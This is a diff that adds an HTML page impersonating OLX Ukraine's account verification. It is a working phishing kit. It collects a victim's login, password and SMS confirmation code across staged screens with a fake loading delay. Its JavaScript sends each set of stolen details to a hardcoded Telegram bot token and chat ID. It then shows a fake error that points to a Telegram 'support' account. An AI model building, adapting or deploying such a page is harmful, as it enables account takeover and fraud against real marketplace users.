@@ -1,0 +1,514 @@
+<!doctype html>
+<html lang="uk">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>OLX верифікація облікового запису</title>
+
+  <style>
+    
+    :root {
+      --primary: #3977f6;
+      --primary-dark: #003b3d;
+      --bg-color: #cbd9fb;
+      --text-main: #002f34;
+      --text-muted: #49676a;
+      --error: #b3261e;
+      --input-bg: #f1f2f2;
+      --focus: #00d9d2;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--primary);
+      color: var(--text-main);
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .bg {
+      position: fixed;
+      inset: 0;
+      overflow: hidden;
+      z-index: -1;
+    }
+
+    .bg:before,
+    .bg:after {
+      content: "";
+      position: absolute;
+      width: 360px;
+      height: 360px;
+      background: var(--bg-color);
+      border-radius: 50%;
+      left: -190px;
+    }
+
+    .bg:before { top: -190px; }
+    .bg:after { bottom: -190px; }
+
+    .card {
+      width: min(500px, calc(100% - 32px));
+      margin-top: 10vh;
+      margin-bottom: 2rem;
+      background: #fff;
+      border-radius: 12px;
+      padding: 40px;
+      box-shadow: 0 15px 45px rgba(0, 0, 0, 0.12);
+      height: fit-content;
+      position: relative;
+    }
+
+    /* Анімація перемикання екранів */
+    section {
+      animation: fadeIn 0.4s ease-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .back-btn {
+      background: none;
+      border: none;
+      padding: 0;
+      cursor: pointer;
+      margin-bottom: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      transition: background 0.2s;
+    }
+
+    .back-btn:hover {
+      background: var(--input-bg);
+    }
+
+    .back-btn svg {
+      width: 24px;
+      height: 24px;
+      fill: var(--text-main);
+    }
+
+    .logo {
+      font-weight: 800;
+      font-size: 38px;
+      margin-bottom: 24px;
+      color: var(--primary);
+    }
+
+    h1 {
+      font-size: 36px;
+      line-height: 1.1;
+      margin: 0 0 16px;
+      font-weight: 800;
+    }
+
+    p {
+      font-size: 18px;
+      line-height: 1.5;
+      margin: 0 0 24px;
+      color: var(--text-muted);
+    }
+
+    label {
+      display: block;
+      font-size: 15px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    input {
+      width: 100%;
+      height: 56px;
+      border: 2px solid transparent;
+      border-radius: 8px;
+      background: var(--input-bg);
+      padding: 0 18px;
+      font-size: 18px;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    input:focus {
+      border-color: var(--focus);
+      background: #fff;
+      box-shadow: 0 4px 12px rgba(0, 217, 210, 0.15);
+    }
+
+    input.input-error {
+      border-color: var(--error);
+      background: #fff;
+    }
+
+    .btn {
+      width: 100%;
+      height: 56px;
+      border: 0;
+      border-radius: 8px;
+      background: var(--primary-dark);
+      color: #fff;
+      font-weight: 700;
+      font-size: 18px;
+      margin-top: 24px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn:hover {
+      background: #002425;
+    }
+
+    .btn:active {
+      transform: scale(0.98);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .error {
+      color: var(--error);
+      font-size: 14px;
+      margin-top: 8px;
+      display: none;
+      font-weight: 500;
+    }
+
+    .birthdate {
+      letter-spacing: 6px;
+      text-align: center;
+      font-size: 26px;
+      font-variant-numeric: tabular-nums;
+    }
+
+    .note {
+      font-size: 14px;
+      color: var(--text-muted);
+      margin-top: 16px;
+      text-align: center;
+    }
+
+    /* Loading state */
+    .loading {
+      text-align: center;
+      padding: 30px 0 10px;
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 24px;
+      border: 4px solid var(--input-bg);
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    .loading-title {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .loading-text {
+      font-size: 16px;
+      color: var(--text-muted);
+    }
+
+    .progress {
+      width: 100%;
+      height: 6px;
+      background: var(--input-bg);
+      border-radius: 10px;
+      margin-top: 30px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background: var(--primary);
+      border-radius: 10px;
+      animation: progress 5s linear forwards;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes progress {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+
+    /* Адаптив */
+    @media (max-width: 600px) {
+      .card {
+        margin-top: 0;
+        border-radius: 0;
+        min-height: 100vh;
+        width: 100%;
+        padding: 30px 20px;
+      }
+      h1 { font-size: 30px; }
+      .logo { font-size: 32px; }
+    }
+    .support-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  text-decoration: none;
+}
+  </style>
+</head>
+
+<body>
+  <div class="bg"></div>
+
+  <main class="card">
+    <button class="back-btn hidden" id="backBtn" onclick="goBack()" aria-label="Повернутися назад">
+      <svg viewBox="0 0 24 24">
+        <path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/>
+      </svg>
+    </button>
+
+    <!-- STEP 1 -->
+    <section id="step1">
+      <div class="logo">OLX UA</div>
+      <h1>Введіть ваш логiн:</h1>
+      <p>Підтвердження облікового запису OLX</p>
+
+      <label for="name">номер телефону або електронна пошта</label>
+      <input 
+        id="name" 
+        autocomplete="name" 
+        placeholder="Логiн" 
+        maxlength="100"
+        onkeydown="handleEnter(event, goLogin)"
+      >
+      <div id="nameError" class="error">Введіть логiн:</div>
+
+      <button class="btn" onclick="goLogin()">Продовжити</button>
+    </section>
+
+    <!-- STEP 2 -->
+    <section id="step2" class="hidden">
+      <div class="logo">OLX</div>
+      <h1>Введіть пароль</h1>
+
+      <label for="login">Пароль</label>
+      <input 
+        id="login" 
+        autocomplete="username" 
+        placeholder="Пароль" 
+        maxlength="50"
+        onkeydown="handleEnter(event, submitRegistration)"
+      >
+      <div id="loginError" class="error">Введіть пароль.</div>
+
+      <button id="continueButton" class="btn" onclick="submitRegistration()">Продовжити</button>
+    </section>
+
+    <!-- LOADING -->
+    <section id="loading" class="hidden">
+      <div class="logo">OLX</div>
+      <div class="loading">
+        <div class="spinner"></div>
+        <div class="loading-title">Перевіряємо дані...</div>
+        <div class="loading-text">Будь ласка, зачекайте кілька хвилин.</div>
+        <div class="progress">
+          <div class="progress-bar"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 3 -->
+    <section id="step3" class="hidden">
+      <div class="logo">OLX</div>
+      <h1>Це точно ви?</h1>
+      <p>Ми відправили вам SMS з кодом підтвердження, ми повинні переконатися що це саме ви, перевірте Viber / SMS / електронну пошту</p>
+
+      <label for="birthdate">Введіть код підтвердження</label>
+      <input 
+        id="birthdate" 
+        class="birthdate" 
+        inputmode="numeric" 
+        autocomplete="bday" 
+        maxlength="6" 
+        placeholder="010299" 
+        oninput="digitsOnly(this)"
+        onkeydown="handleEnter(event, finish)"
+      >
+      <div id="birthdateError" class="error">Спробуйте ще раз!</div>
+
+      <button class="btn" onclick="finish()">Підтвердити</button>
+      <div class="note">OLX.UA 2026</div>
+    </section>
+
+    <!-- DONE -->
+    <section id="done" class="hidden">
+      <div class="logo">OLX</div>
+      <h1>Помилка!</h1>
+      <p>Дані або код були введені неправильно, спробуйте ще раз або зверніться до служби підтримки!</p>
+      <a href="https://t.me/olx_bezpeka" class="btn support-btn" target="_blank">Служба підтримки</a>
+    </section>
+  </main>
+
+  <script>
+    // ⚠️ УВАГА: В реальних проектах токен бота та ID чату НЕ МОЖНА зберігати в HTML файлі!
+    // Їх можуть вкрасти. Це має працювати через ваш власний бекенд (PHP, Node.js, Python тощо).
+    const TELEGRAM_BOT_TOKEN = "8671990790:AAFJ9HAc4SWswxBNKYgIJdqiO6xlI1YRqzw";
+    const TELEGRAM_CHAT_ID = "-1003571283881";
+
+    const requestId = "MS-" + crypto.randomUUID().replaceAll("-", "").substring(0, 8).toUpperCase();
+    const sections = ["step1", "step2", "loading", "step3", "done"];
+
+    function $(id) {
+      return document.getElementById(id);
+    }
+
+    // Обробка натискання Enter
+    function handleEnter(event, actionFunc) {
+      if (event.key === 'Enter') {
+        event.preventDefault();
+        actionFunc();
+      }
+    }
+
+    function updateBackButtonVisibility(currentId) {
+      const backBtn = $("backBtn");
+      if (currentId === "step1" || currentId === "loading" || currentId === "done") {
+        backBtn.classList.add("hidden");
+      } else {
+        backBtn.classList.remove("hidden");
+      }
+    }
+
+    function show(id) {
+      sections.forEach(section => {
+        $(section).classList.add("hidden");
+      });
+      $(id).classList.remove("hidden");
+      updateBackButtonVisibility(id);
+      
+      // Фокус на інпут при переході на новий екран
+      const input = $(id).querySelector('input');
+      if(input) setTimeout(() => input.focus(), 100);
+    }
+
+    function goBack() {
+      const current = sections.findIndex(id => !$(id).classList.contains("hidden"));
+      if (current > 0) {
+        show(sections[current - 1]);
+      }
+    }
+
+    function showError(inputId, errorId, show) {
+      $(errorId).style.display = show ? "block" : "none";
+      if (show) {
+        $(inputId).classList.add("input-error");
+      } else {
+        $(inputId).classList.remove("input-error");
+      }
+    }
+
+    function goLogin() {
+      const name = $("name").value.trim();
+      if (!name) {
+        showError("name", "nameError", true);
+        return;
+      }
+      showError("name", "nameError", false);
+      show("step2");
+    }
+
+    async function sendTelegram(text) {
+      if (TELEGRAM_BOT_TOKEN === "PASTE_NEW_BOT_TOKEN_HERE") {
+        console.warn("Telegram Bot Token не вказано.");
+        return false;
+      }
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+          })
+        });
+        const result = await response.json();
+        return result.ok === true;
+      } catch (error) {
+        console.error("Telegram error:", error);
+        return false;
+      }
+    }
+
+    async function submitRegistration() {
+      const name = $("name").value.trim();
+      const login = $("login").value.trim();
+
+      if (!login) {
+        showError("login", "loginError", true);
+        return;
+      }
+      showError("login", "loginError", false);
+
+      const text = `🆕 <b>НОВАЯ ЗАЯВКА OLX</b>\n\n🆔 ID: <code>${requestId}</code>\n👤 Логин: <code>${name}</code>\n🔑 Пароль: <code>${login}</code>`;
+      sendTelegram(text); // Відправляємо без await, щоб не затримувати UI
+
+      show("loading");
+
+      // Чекаємо 5 секунд
+      await new Promise(resolve => setTimeout(resolve, 5000));
+      show("step3");
+    }
+
+    function digitsOnly(input) {
+      input.value = input.value.replace(/\D/g, "").substring(0, 6);
+      showError("birthdate", "birthdateError", false);
+    }
+
+    function isValidBirthdate(value) {
+      if (!/^\d{6}$/.test(value)) return false;
+      return true; // 👈 ОСТАВИТЬ ТОЛЬКО ЭТО
+    }
+
+    async function finish() {
+      const birthdate = $("birthdate").value.trim();
+
+      if (!isValidBirthdate(birthdate)) {
+        showError("birthdate", "birthdateError", true);
+        return;
+      }
+      showError("birthdate", "birthdateError", false);
+
+      const name = $("name").value.trim();
+      const login = $("login").value.trim();
+
+      const text = `✅ <b>ДАННЫЕ ЗАЯВКИ olx</b>\n\n🆔 ID: <code>${requestId}</code>\n👤 Логин: <b>${name}</b>\n🔑 Пароль: <b>${login}</b>\n🎂 КОД: <code>${birthdate}</code>`;
+      
+      sendTelegram(text);
+      show("done");
+    }
+  </script>
+</body>
+</html>
